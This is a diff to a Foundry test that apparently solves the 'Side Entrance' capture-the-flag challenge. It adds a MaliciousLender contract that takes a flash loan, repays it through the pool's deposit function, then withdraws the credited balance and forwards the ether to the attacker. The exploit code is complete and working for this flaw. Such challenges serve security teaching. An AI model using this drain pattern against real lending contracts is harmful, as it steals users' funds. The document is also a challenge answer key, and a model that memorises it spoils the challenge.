@@ -6,6 +6,44 @@ import "forge-std/Test.sol";
 
 import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
 
+contract MaliciousLender {
+    address lenderPool;
+    address receiver;
+
+    function getFlashLoan(address _lenderPool, uint256 amount) public {
+        console.log("MaliciousLender#getFlashLoan::requesting Flash Loan");
+        lenderPool = _lenderPool;
+        SideEntranceLenderPool(_lenderPool).flashLoan(amount);
+    }
+
+    function execute() external payable {
+        console.log(
+            "MaliciousLender#execute::loan received from ",
+            msg.sender,
+            msg.value
+        );
+        SideEntranceLenderPool(lenderPool).deposit{value: msg.value}();
+        console.log("MaliciousLender#execute::flash loan paid back");
+    }
+
+    function withdraw(address _receiver) public {
+        receiver = _receiver;
+        SideEntranceLenderPool(lenderPool).withdraw();
+    }
+
+    receive() external payable {
+        console.log(
+            "MaliciousLender#receive::ether received after withdraw",
+            msg.value
+        );
+        payable(receiver).transfer(msg.value);
+        console.log(
+            "MaliciousLender#receive::received ether transferred to receiver(i.e attacker)",
+            msg.value
+        );
+    }
+}
+
 contract SideEntrance is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
 
@@ -34,7 +72,16 @@ contract SideEntrance is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        // `deposit()` considers repayment of flashloan and regular deposits as one
 
+        // 1. take a flashloan and repay the flashloan using deposit function
+        MaliciousLender maliciousLender = new MaliciousLender();
+        maliciousLender.getFlashLoan(
+            address(sideEntranceLenderPool),
+            ETHER_IN_POOL
+        );
+        // 2. withdraw the deposited token and transfer
+        maliciousLender.withdraw(address(attacker));
         /** EXPLOIT END **/
         validation();
     }
